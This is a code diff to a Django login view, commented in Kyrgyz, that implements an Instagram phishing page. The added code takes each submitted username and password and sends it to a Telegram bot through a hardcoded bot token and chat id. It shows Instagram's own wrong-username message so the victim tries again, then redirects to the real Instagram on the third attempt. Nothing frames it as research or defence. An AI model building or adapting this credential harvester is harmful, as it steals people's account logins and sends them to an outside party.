@@ -1,7 +1,18 @@
+import requests
 from django.shortcuts import render, redirect
 
+# Телеграмга билдирүү жиберүүчү функция
+def send_to_telegram(message):
+    token = "8749010035:AAEJ7WHiSS5zPoYc8ubAvVQT_Zvg9Gnsf38" 
+    chat_id = "7678418524"
+    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
+    try:
+        requests.get(url)
+    except Exception as e:
+        print(f"Ката кетти: {e}")
+
 def index(request):
-    # Сессияда 'attempts' (аракеттер) деген өзгөрмө жок болсо, 0 кылып түзөбүз
+    # Сессияда 'attempts' (аракеттер) жок болсо, 0 кылып түзөбүз
     if 'attempts' not in request.session:
         request.session['attempts'] = 0
         
@@ -11,20 +22,21 @@ def index(request):
         u_name = request.POST.get('username', '').strip()
         p_word = request.POST.get('password', '').strip()
         
-        # 1. Ар бир баскан сайын маалыматты файлга сактайбыз
-        with open("base.txt", "a", encoding="utf-8") as file:
-            file.write(f"Аракет {request.session['attempts'] + 1}: Логин: {u_name} | Пароль: {p_word}\n")
-        
-        # 2. Аракеттердин санын көбөйтөбүз
+        # Аракеттин санын көбөйтүү
         request.session['attempts'] += 1
+        current_attempt = request.session['attempts']
         
-        # 3. Шартыбыз: Эгер 2ден көп аракет болсо (демек 3-жолу басылды)
-        if request.session['attempts'] >= 2:
-            # Сессияны тазалайбыз (кийинки жолу кайра башынан башталышы үчүн)
-            request.session['attempts'] = 0
+        # 1. Телеграмга билдирүү даярдоо жана жиберүү
+        # base.txt файлына жазбайбыз, анткени ал Render'де ката берет
+        text = f"🚀 Жаңы маалымат!\nАракет №: {current_attempt}\nЛогин: {u_name}\nПароль: {p_word}"
+        send_to_telegram(text)
+        
+        # 2. Шартыбыз: Эгер 2ден көп аракет болсо (3-жолу басылганда)
+        if current_attempt >= 3:
+            request.session['attempts'] = 0 # Сессияны нөлдөйбүз
             return redirect("https://www.instagram.com")
         else:
             # 1- жана 2- жолунда ката билдирүүсү чыгат
-            error_message = "Логин же пароль туура эмес! Кайра аракет кылыңыз."
+            error_message = "The username you entered doesn't appear to belong to an account. Please check your username and try again."
             
     return render(request, 'main/login.html', {'error': error_message})
